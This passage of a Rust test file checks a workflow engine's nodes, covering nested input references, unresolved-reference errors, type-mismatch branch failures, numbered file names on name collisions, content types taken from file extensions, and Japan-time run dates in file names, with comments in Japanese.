    let exec = CapabilityNodeExecutor::new(
        Arc::new(FakePorts::default()) as Arc<dyn NodePorts>,
        lazy_journal(),
        Arc::new(CapturingAudit::default()),
    )
    .with_script_engine(engine, script_runtime::engine::Limits::default());
    let source = json!({ "inline": "function main(i){ return { got: i }; }" });
    let params = json!({ "source": source, "input": {
        "title": { "$from": "input", "path": "/title" },
        "amount": { "$from": "input", "path": "/amount" },
        "summary": { "$template": "件名: {title} / 金額: {amount} 円", "vars": {
            "title": { "$from": "input", "path": "/title" },
            "amount": { "$from": "input", "path": "/amount" } } } } });
    let res = exec
        .execute("script.run", &params, &ctx(expense_input(), vec![]))
        .await;
    assert!(res.ok, "{:?}", res.error);
    assert_eq!(
        res.output["got"],
        json!({ "title": "出張旅費", "amount": 12000, "summary": "件名: 出張旅費 / 金額: 12000 円" })
    );

    // input を書いたのに解決できなければ run 入力全体へ黙って差し替えない（BUG-13）。
    let missing = json!({ "source": source, "input": { "$from": "input", "path": "/nope" } });
    let res = exec
        .execute("script.run", &missing, &ctx(expense_input(), vec![]))
        .await;
    assert_eq!(res.error.unwrap().code, "expr_resolve_error");
    // input を省いたときだけステップ入力を渡す。
    let omitted = json!({ "source": source });
    let res = exec
        .execute("script.run", &omitted, &ctx(expense_input(), vec![]))
        .await;
    assert!(res.ok, "{:?}", res.error);
    assert_eq!(res.output["got"], expense_input());
}

/// skill.invoke の input も入れ子の参照を展開する（instructions だけの skill は input を prompt にする）。
#[tokio::test]
async fn skill_input_nested_refs_are_resolved() {
    let ports = Arc::new(FakePorts::default());
    *ports.skill.lock().unwrap() = Some(workflow_engine::nodes::ResolvedSkillView {
        name: "expense".into(),
        instructions: "経費規程に従って確認する。".into(),
        shiki_script: None,
        allowed_scopes: None,
    });
    let exec = executor(Arc::clone(&ports), Arc::new(CapturingAudit::default()));
    let params = json!({ "skill": "skill:expense@1", "input": {
        "title": { "$from": "input", "path": "/title" },
        "note": { "$template": "{a} 円", "vars": { "a": { "$from": "input", "path": "/amount" } } } } });
    let res = exec
        .execute("skill.invoke", &params, &ctx(expense_input(), vec![]))
        .await;
    assert!(res.ok, "{:?}", res.error);
    let prompt = res.output["text"]
        .as_str()
        .unwrap()
        .strip_prefix("echo:")
        .unwrap();
    assert_eq!(
        serde_json::from_str::<Value>(prompt).unwrap(),
        json!({ "title": "出張旅費", "note": "12000 円" })
    );
}

/// storage.write の folder を書いたのに解決できないときはルートへ書かない（BUG-13）。
#[tokio::test]
async fn storage_write_unresolved_folder_does_not_fall_back_to_root() {
    let ports = Arc::new(FakePorts::default());
    let exec = executor(Arc::clone(&ports), Arc::new(CapturingAudit::default()));
    let scopes = vec!["storage.write".to_string()];
    for (folder, code) in [
        (
            json!({ "$from": "input", "path": "/folder" }),
            "expr_resolve_error",
        ),
        (json!({ "$from": "input", "path": "/title" }), "invalid"),
    ] {
        let params = json!({ "name": "o.txt", "content": "x", "folder": folder });
        let res = exec
            .execute(
                "storage.write",
                &params,
                &ctx(expense_input(), scopes.clone()),
            )
            .await;
        assert_eq!(res.error.unwrap().code, code, "{folder}");
    }
    assert!(
        ports.last_write.lock().unwrap().is_none(),
        "書込は発生しない"
    );
}

/// 条件の大小比較で型が合わない（文字列の「10000」と数値）ときは黙って false にせず失敗する（BUG-14）。
#[tokio::test]
async fn branch_type_mismatch_fails_the_step() {
    let exec = executor(
        Arc::new(FakePorts::default()),
        Arc::new(CapturingAudit::default()),
    );
    let params = json!({ "condition": { "cmp": {
        "left": { "$from": "input", "path": "/amount" }, "op": "gte", "right": "10000" } } });
    let res = exec
        .execute("control.branch", &params, &ctx(expense_input(), vec![]))
        .await;
    assert!(!res.ok);
    let err = res.error.unwrap();
    assert_eq!(err.code, "expr_type_error");
    assert!(
        err.message.contains("数値") && err.message.contains("文字列"),
        "{}",
        err.message
    );
}

/// DB 必要（effect_journal）: workflow.start の input も入れ子の参照を展開し、書いた参照が解決できなければ
/// null で子を起動しない（BUG-13）。
#[tokio::test]
async fn workflow_start_input_nested_refs_are_resolved() {
    let Ok(db) = std::env::var("STORAGE_TEST_DATABASE_URL") else {
        eprintln!("STORAGE_TEST_DATABASE_URL 未設定のためスキップ");
        return;
    };
    let pool = PgPoolOptions::new()
        .max_connections(2)
        .connect(&db)
        .await
        .expect("test DB 接続");
    sqlx::migrate!("../../migrations")
        .run(&pool)
        .await
        .expect("migrate");
    let ports = Arc::new(FakePorts::default());
    let exec = CapabilityNodeExecutor::new(
        Arc::clone(&ports) as Arc<dyn NodePorts>,
        EffectJournal::new(pool),
        Arc::new(CapturingAudit::default()),
    );
    let mut c = ctx(expense_input(), vec!["workflow.start".into()]);
    c.idempotency_key = format!("wf:start-test:{}", Uuid::new_v4());
    let params = json!({ "name": "child-wf", "input": {
        "title": { "$from": "input", "path": "/title" },
        "lines": [ { "$template": "{a} 円", "vars": { "a": { "$from": "input", "path": "/amount" } } } ] } });
    let res = exec.execute("workflow.start", &params, &c).await;
    assert!(res.ok, "{:?}", res.error);
    let (name, input) = ports.last_start.lock().unwrap().take().unwrap();
    assert_eq!(name, "child-wf");
    assert_eq!(input, json!({ "title": "出張旅費", "lines": ["12000 円"] }));

    c.idempotency_key = format!("wf:start-test:{}", Uuid::new_v4());
    let missing = json!({ "name": "child-wf", "input": { "$from": "input", "path": "/nope" } });
    let res = exec.execute("workflow.start", &missing, &c).await;
    assert_eq!(res.error.unwrap().code, "expr_resolve_error");
    assert!(ports.last_start.lock().unwrap().is_none(), "子は起動しない");
}

/// 同じ名前のファイルがあるとき: 省略（既存の定義）は今のまま失敗にし、原因どおりの code と文言を返す。
/// 番号を付ける扱いなら、空いている名前（`週報 (3).md`）で保存し、どの試しも同じ冪等キーと op_digest で送る
/// （BUG-97・D-97）。
#[tokio::test]
async fn storage_write_handles_taken_names_by_policy() {
    let ports = Arc::new(FakePorts::default());
    *ports.taken_names.lock().unwrap() = vec!["週報.md".into(), "週報 (2).md".into()];
    let exec = executor(ports.clone(), Arc::new(CapturingAudit::default()));
    let c = ctx(json!({}), vec!["storage.write".into()]);

    // 省略は失敗にする（この項目が無かったころの定義の挙動）。1 回しか試さない。
    let res = exec
        .execute(
            "storage.write",
            &json!({ "name": "週報.md", "content": "x" }),
            &c,
        )
        .await;
    assert!(!res.ok);
    let err = res.error.unwrap();
    assert_eq!(err.code, "name_taken");
    assert!(
        err.message.contains("同じ名前のファイル「週報.md」"),
        "{}",
        err.message
    );
    assert!(!err.message.contains("重なった"), "{}", err.message);
    assert!(!err.retryable);
    assert_eq!(ports.write_tries.lock().unwrap().len(), 1);

    // 番号を付ける: 1 回目は元の名前、2 回目から拡張子の前に番号を付ける。
    ports.write_tries.lock().unwrap().clear();
    let res = exec
        .execute(
            "storage.write",
            &json!({ "name": "週報.md", "content": "x", "on_name_taken": "add_number" }),
            &c,
        )
        .await;
    assert!(res.ok, "{:?}", res.error);
    assert_eq!(res.output["name"], "週報 (3).md");
    let tries = ports.write_tries.lock().unwrap().clone();
    let names: Vec<&str> = tries.iter().map(|(n, _, _)| n.as_str()).collect();
    assert_eq!(names, ["週報.md", "週報 (2).md", "週報 (3).md"]);
    assert!(
        tries
            .iter()
            .all(|(_, k, d)| *k == tries[0].1 && *d == tries[0].2),
        "試し直しで冪等キーか op_digest が変わった: {tries:?}"
    );

    // 番号を付けた名前が上限まで埋まっていれば、上限の名前を言って失敗にする。
    *ports.taken_names.lock().unwrap() = (1..=50)
        .map(|n| workflow_engine::ir::params::numbered_name("a.txt", n))
        .collect();
    let res = exec
        .execute(
            "storage.write",
            &json!({ "name": "a.txt", "content": "x", "on_name_taken": "add_number" }),
            &c,
        )
        .await;
    assert!(!res.ok);
    let err = res.error.unwrap();
    assert_eq!(err.code, "name_taken");
    assert!(
        err.message.contains("「a (50).txt」まで"),
        "{}",
        err.message
    );
}

/// ファイルの種類を決めないときは、ファイル名の拡張子から決める（社内文書の検索に出るように・D-97）。決めたときは
/// それを使い、知らない拡張子は種類の分からないファイルにする。
#[tokio::test]
async fn storage_write_derives_the_content_type_from_the_name() {
    let ports = Arc::new(FakePorts::default());
    let exec = executor(ports.clone(), Arc::new(CapturingAudit::default()));
    let c = ctx(json!({}), vec!["storage.write".into()]);
    for (params, want) in [
        (
            json!({ "name": "議事録.md", "content": "x" }),
            "text/markdown",
        ),
        (json!({ "name": "a.TXT", "content": "x" }), "text/plain"),
        (json!({ "name": "a.csv", "content": "x" }), "text/csv"),
        (
            json!({ "name": "a.json", "content": "x" }),
            "application/json",
        ),
        (json!({ "name": "a.html", "content": "x" }), "text/html"),
        (
            json!({ "name": "a.bin", "content": "x" }),
            "application/octet-stream",
        ),
        (
            json!({ "name": "noext", "content": "x" }),
            "application/octet-stream",
        ),
        (
            json!({ "name": "a.md", "content": "x", "content_type": "text/plain" }),
            "text/plain",
        ),
    ] {
        let res = exec.execute("storage.write", &params, &c).await;
        assert!(res.ok, "{params}: {:?}", res.error);
        let ct = ports
            .last_write
            .lock()
            .unwrap()
            .as_ref()
            .unwrap()
            .content_type
            .clone();
        assert_eq!(ct, want, "{params}");
    }
}

/// 実行情報（`$from run`）に、実行を始めた日と日時（日本時間）が入る。ファイル名に差し込める（D-97）。
#[tokio::test]
async fn run_info_dates_can_be_inserted_into_file_names() {
    let ports = Arc::new(FakePorts::default());
    let exec = executor(ports.clone(), Arc::new(CapturingAudit::default()));
    let mut c = ctx(json!({}), vec!["storage.write".into()]);
    c.run_started_at = chrono::DateTime::parse_from_rfc3339("2026-10-27T23:30:00Z")
        .unwrap()
        .with_timezone(&chrono::Utc);
    let params = json!({
        "name": { "$template": "日報-{d}.md", "vars": { "d": { "$from": "run", "path": "/date" } } },
        "content": { "$from": "run", "path": "/started_at" }
    });
    let res = exec.execute("storage.write", &params, &c).await;
    assert!(res.ok, "{:?}", res.error);
    let w = ports.last_write.lock().unwrap().clone().unwrap();
    assert_eq!(w.name, "日報-2026-10-28.md");
    assert_eq!(w.bytes, b"2026-10-28T08:30:00+09:00");
}
